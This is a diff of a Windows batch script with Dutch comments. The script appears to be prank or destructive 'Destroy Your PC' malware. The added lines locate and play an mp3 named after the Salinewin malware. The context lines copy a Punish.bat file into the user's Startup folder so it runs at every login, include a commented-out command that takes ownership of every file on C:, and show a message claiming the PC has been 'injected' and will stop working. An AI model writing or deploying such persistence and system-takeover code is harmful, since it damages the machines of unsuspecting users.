@@ -1,7 +1,39 @@
 @echo off
 
-:: === DIRECTE MUZIEK ===
-start "" "Salinewin.exe V2 virus beat (LOUD).mp3"
+@echo off
+setlocal
+
+:: Verwachte bestandsnaam (exact)
+set "FNAME=Salinewin.exe V2 virus beat (LOUD).mp3"
+
+:: 1) Kijk eerst in dezelfde map als de .bat
+if exist "%~dp0%FNAME%" (
+  set "TRACK=%~dp0%FNAME%"
+  goto :PLAY
+)
+
+:: 2) Kijk in de Downloads map van de huidige gebruiker
+if exist "%USERPROFILE%\Downloads\%FNAME%" (
+  set "TRACK=%USERPROFILE%\Downloads\%FNAME%"
+  goto :PLAY
+)
+
+echo [ERROR] Geen mp3 gevonden.
+echo Gezocht op:
+echo  - %~dp0%FNAME%
+echo  - %USERPROFILE%\Downloads\%FNAME%
+pause
+exit /b 1
+
+:PLAY
+echo Playing: "%TRACK%"
+start "" "%TRACK%"
+
+:: fallback: probeer via PowerShell WMPlayer (als start() faalt)
+timeout /t 1 >nul
+powershell -NoProfile -Command ^
+  "$p='%TRACK%'; try { $w=New-Object -ComObject WMPlayer.OCX; $m=$w.newMedia($p); $w.currentPlaylist.appendItem($m); $w.controls.play() } catch { Start-Process -FilePath $p }" >nul 2>&1
+
 
 :: === DROP punish.bat VOORAF IN STARTUP ===
 copy "%~dp0Punish.bat" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Punish.bat" >nul
@@ -74,3 +106,4 @@ rem powershell -Command "Takeown /f C:\* /r /d y; Icacls C:\* /grant '$env:USERN
 powershell -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('Hi, Destroy Your PC has injected your PC. After reboot or misuse your computer will not function normally anymore.', 'Warning')"
 
 pause
+
